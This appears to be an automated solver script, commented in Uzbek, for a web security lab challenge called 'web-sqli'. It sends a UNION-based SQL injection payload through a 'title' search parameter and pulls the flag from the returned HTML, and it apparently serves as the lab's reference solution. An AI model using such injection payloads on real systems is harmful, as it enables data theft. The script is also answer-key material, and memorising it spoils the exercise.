/**
 * Yechim izohi:
 * Laboratoriya sahifasidagi 'title' qidiruv parametri orqali SQL Injection (UNION Attack) amalga oshiriladi.
 * Payload: ' UNION SELECT 1, flag_val, 'secret' FROM secrets --
 * Talaba HTTP javobidagi HTML jadvaldan flag{...} ni oladi.
 */
import { withWebLabInstance, extractFlagFromText } from "./solver-utils";

export async function solve(options?: { userId?: string }): Promise<string> {
  const userId = options?.userId || "student_solver_test";

  return withWebLabInstance("web-sqli", userId, async (baseUrl) => {
    const payload = encodeURIComponent("' UNION SELECT 1, flag_val, 'secret' FROM secrets --");
    const res = await fetch(`${baseUrl}/?title=${payload}`);
    const html = await res.text();
    const flag = extractFlagFromText(html);
    if (!flag) throw new Error("web-sqli: UNION inyeksiya javobidan flag topilmadi");
    return flag;
  });
}

if (require.main === module) {
  solve().then((f) => console.log("[SOLVER SUCCESS] web-sqli flag:", f));
}
